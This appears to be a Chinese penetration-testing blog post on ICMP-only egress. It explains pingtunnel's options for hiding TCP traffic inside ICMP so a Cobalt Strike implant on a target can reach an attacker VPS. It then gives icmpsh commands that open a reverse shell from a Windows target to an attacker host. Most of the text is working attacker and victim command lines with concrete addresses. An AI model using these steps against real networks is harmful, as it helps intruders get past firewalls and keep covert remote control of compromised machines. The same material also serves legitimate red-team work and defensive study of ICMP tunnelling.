---
title: 只有icmp协议出网场景
date: 2025-02-17 14:09:35
updated: 2025-06-19 08:28:50
tags:
  - 内网
  - 隧道搭建
---
# PingTunnel

pingtunnel 是一款把 tcp/udp/sock5 流量伪装成 icmp 流量进行转发的工具。[GitHub - esrrhs/pingtunnel: Pingtunnel is a tool that send TCP/UDP traffic over ICMP](https://github.com/esrrhs/pingtunnel/)

<details open>
<summary>参数详情</summary>

服务端参数

• -key：设置的密码，默认为 0

• -nolog：不写日志文件，只打印标准输出，默认 0

• -noprint：不打印屏幕输出，默认 0

• -loglevel：日志文件等级，默认 info

• -maxconn：最大连接数，默认 0，不受限制

• -maxprt：server 最大处理线程数，默认 100

• -maxprb：server 最大处理线程 buffer 数，默认 1000

• -conntt：server 发起连接到目标地址的超时时间，默认 1000ms

客户端参数

• -l：本地的地址，发到这个端口的流量将转发到服务器

• -s：服务器的地址，流量将通过隧道转发到这个服务器

• -t：远端服务器转发的目的地址，流量将转发到这个地址

• -timeout：地记录连接超时的时间，单位是秒，默认 60s

• -key：设置的密码，默认 0

• -tcp：设置是否转发 tcp，默认 0

• -tcp\_bs：tcp 的发送接收缓冲区大小，默认 1MB

• -tcp\_mw：tcp 的最大窗口，默认 20000

• -tcp\_rst：tcp 的超时发送时间，默认 400ms

• -tcp\_gz：当数据包超过这个大小，tcp 将压缩数据，0 表示不压缩，默认0

• -tcp\_stat：打印 tcp 的监控，默认 0

• -nolog：不写日志文件，只打印标准输出，默认 0

• -noprint：不打印屏幕输出，默认 0

• -loglevel：日志文件等级，默认 info

• -sock5：开启 sock5 转发，默认 0

• -profile：在指定端口开启性能检测，默认 0 不开启

• -s5filter：sock5 模式设置转发过滤，默认全转发，设置 CN 代表 CN 地区的直连不转发

• -s5ftfile：sock5 模式转发过滤的数据文件，默认读取当前目录的GeoLite2-Country.mmdb

</details>

## 端口转发上线CS

<details open>
<summary>防火墙设置</summary>

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1739866180688-afb6650a-d7d4-4367-806e-73cb836f4363.png)

复现过程中发现的问题：  
根据前者设置，隧道才能打通

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1739866153727-7327de57-e845-4b91-9875-bf7598d246cd.png)

</details>

```bash
#vps
##关闭自带icmp回复
sysctl -w net.ipv4.icmp_echo_ignore_all=1
./pingtunnel -type server

#目标机
pingtunnel.exe -type client -l 127.0.0.1:6666 -s xx.xxx.xxx.99 -t xx.xxx.xxx.99:8998 -tcp 1 -noprint 1 -nolog 1
##将本地tcp端口6666流量封装成icmp转发到xx.xxx.xxx.99:8998上
```

监听器1用于生成木马，监听器test用于上线

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1739867325598-3d42feaa-4037-4c47-8a0f-1eb4b18bf3d4.png)

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1739865901628-14a382b1-09fc-4d39-83c4-7c18b51df6cd.png)

# Icmpshf反弹shell(目标机为Win)

[GitHub - bdamele/icmpsh: Simple reverse ICMP shell](https://github.com/inquisb/icmpsh.git)

```bash
#vps
##安装impacket
### git clone https://github.com/SecureAuthCorp/impacket.git
### cd impacket
### sudo python2 setup.py install
##关闭自带icmp回复
sysctl -w net.ipv4.icmp_echo_ignore_all=1
##第一个IP是VPS的eth0网卡IP，第二个IP是目标机器出口的公网 IP
python2 icmpsh_m.py 172.20.92.13 124.65.9.209

#目标机
icmpsh.exe -t 124.65.9.209 -d 500 -b 30 -s 128
```
<details open>
<summary>参数详情</summary>

​\-t：指定远程主机 ip

\-d：请求之间的延迟，单位为毫秒，默认 200

\-b：退出前的最大空格数（未应答的 icmp 请求）

\-s：最大数据缓冲区的字节大小（默认值为 64 个字节）

</details>